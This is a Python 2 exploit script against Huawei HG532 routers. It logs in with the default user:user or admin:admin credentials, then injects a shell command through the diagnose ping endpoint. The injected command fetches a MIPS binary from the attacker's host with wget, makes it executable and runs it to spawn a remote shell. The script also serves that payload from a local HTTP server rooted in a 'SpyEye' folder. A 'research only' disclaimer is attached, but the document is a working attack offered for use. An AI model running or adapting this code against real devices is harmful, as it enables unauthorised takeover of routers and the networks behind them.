#!/usr/bin/python

import requests
import time
import urllib
import sys
import warnings
import hashlib
import base64
import pyfiglet
import subprocess
from time import sleep

class Colors:
        BLUE        = '\033[94m'
        GREEN       = '\033[32m'
        RED         = '\033[0;31m'
        DEFAULT     = '\033[0m'
        ORANGE      = '\033[33m'
        WHITE       = '\033[97m'
        BOLD        = '\033[1m'
        BR_COLOUR = '\033[1;37;40m'


def attack(url,ip,shellcode):
	if not sys.warnoptions:
	    warnings.simplefilter("ignore")

	user = 'user'
	password='user'

	user1= 'admin'
	password1='admin'

	password_sha256 = hashlib.sha256(password.encode()).hexdigest()
	password_base64 = base64.b64encode(hashlib.sha256(password.encode()).hexdigest())

	password1_sha256 = hashlib.sha256(password1.encode()).hexdigest()
	password1_base64 = base64.b64encode(hashlib.sha256(password1.encode()).hexdigest())

	s = requests.Session()

	print Colors.BLUE+"[*] Target: "+url+Colors.DEFAULT
	cmd="wget -g -v -l /tmp/"+shellcode+" -r "+shellcode+" -P8000 "+ip+" && chmod +x /tmp/"+shellcode+"&&/tmp/"+shellcode
	payload = urllib.quote_plus(' -c1; '+cmd+' > /var/pingres.txt; #')


	data = {'Username':'user','Password':''+password_base64+''}
	data1 = {'Username':'admin','Password':''+password1_base64+''}

	cookie = {'Language':'en','FirstMenu':'Admin_0','SecondMenu':'Admin_0_0','ThirdMenu':'Admin_0_0_0'}
	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
                   "Connection":"close","Accept-Language":"en-US,en;q=0.5",
                   "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}

	url_login = url+'/index/login.cgi'
	url_logout = url+'/index/logout.cgi'
	test_url = url+'/html/content1.asp'
	url_diagnose = url+'/html/management/excutecmdfordiagnose.cgi?cmd=127.0.0.1'+payload+'&RequestFile=/html/management/pingstatus.asp'


	try:
		request_login = s.post(url_login, data=data, cookies=cookie,headers=headers, verify=False)
		req = s.get(test_url, cookies=cookie, verify=False)

		if  int(req.headers['content-length']) > 805:
			print Colors.GREEN+"[+] Login Success with user:user credentials..."+Colors.DEFAULT
			#request_diagnose = s.post(url_diagnose, cookies=cookie, verify=False)
		else:
			print Colors.BLUE+"[*] Trying credentials admin:admin"+Colors.DEFAULT
			try:
				request_login = s.post(url_login, data=data1, cookies=cookie,headers=headers, verify=False)
				req = s.get(test_url, cookies=cookie, verify=False)
				if  int(req.headers['content-length']) > 805:
			        	print Colors.GREEN+"[+] Login Success with admin:admin credentials ..."+Colors.DEFAULT
#			        	request_diagnose = s.post(url_diagnose, cookies=cookie, verify=False)
				else:
					print Colors.RED+"[-] Couldn't login to target with any default credentials"+Colors.DEFAULT
					sys.exit(1)
			except Exception as e:
				print COLORS.RED+"[-] Connection to the target was lost to the target !!!"+Colors.DEFAULT
				sys.exit(1)

	except Exception as e:
		print Colors.RED+"[*] Nothing Found on the url given: "+url+Colors.DEFAULT
		sys.exit(1)

	print Colors.ORANGE+"[+] Sending the exploit 3 2 1 ..."+Colors.DEFAULT
	try:
		s.post(url_diagnose, cookies=cookie,timeout=3, verify=False)
        	s.post(url_logout, cookies=cookie)
        except Exception as e:
		print Colors.GREEN+"[+] You should have received your shell by now !!!!"+Colors.DEFAULT
		return
'''
	txt = request_diagnose.text.split('PingResult = "')

	result = txt[1].replace('\\n" + "', '\n')

	print "[+] Output shown below:"
	print '\n'+result.split('";')[0]
'''


def main():
	ascii_banner = pyfiglet.figlet_format("Alterna Solutions",width=150)
	print Colors.GREEN+ ascii_banner+Colors.DEFAULT
	print Colors.BOLD+"This program is a property of Alterna Solutions"
	print Colors.BOLD+"Developed by Moustafa Shedeed"+Colors.DEFAULT
	print Colors.BLUE+"[*] This program exploits a command injection vulnerability in the Huwaei HG532* models"+Colors.DEFAULT
	print Colors.BLUE+"[*] This is for research reason only !!!"+Colors.DEFAULT

	if len(sys.argv) == 4:
			url = str(sys.argv[1])
			ip = str(sys.argv[2])
			shellcode= str(sys.argv[3])
			p = serv()
			print Colors.BLUE+"[*] Spawning python SimpleHTTPserver on port 8000 to serve the payload"+Colors.DEFAULT
			print Colors.BLUE+"[*] You should have your listner ready"+Colors.DEFAULT
			attack(url,ip,shellcode)
			p.terminate()
	else:
		print Colors.BOLD+"[-] Missing arguments <target-url> and <LHOST> and <Mips-shell-filename>"+Colors.DEFAULT
		print Colors.BOLD+"[*] Example usage ./hg532n.py < http://target-ip/ > <LHOST> <FILENAME>"+Colors.DEFAULT
		sys.exit(1)

def serv():
	null = open('/dev/null', 'w')

	p = subprocess.Popen(
		[sys.executable, '-m', 'SimpleHTTPServer', '8000'],
		cwd='/root/SpyEye',
		stdout=null,
		stderr=null,
	)
	sleep(1)
	return p



def start_server(path, port=8000):
	os.chdir(path)
	httpd = HTTPServer(('', port), CGIHTTPRequestHandler)
	httpd.serve_forever()

if __name__=='__main__':
	main()
